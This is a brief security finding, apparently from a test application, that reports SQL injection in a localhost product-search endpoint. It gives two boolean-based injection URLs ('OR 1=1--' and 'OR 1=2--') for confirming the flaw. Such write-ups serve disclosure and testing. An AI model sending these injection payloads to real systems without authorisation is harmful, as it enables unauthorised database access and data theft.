# SQL Injection

## Overview

An SQL injection vulnerability exists in

```
http://localhost:5000/api/products/search?keyword=AAAA
```

## Exploitation

An attacker can send specially craft queries to inject and execute arbitrary SQL query in the backend database. The presence of the SQL injection can be verified remotely using following two queries

```
http://localhost:5000/api/products/search?keyword=A%' OR 1=1--
http://localhost:5000/api/products/search?keyword=A%' OR 1=2--
```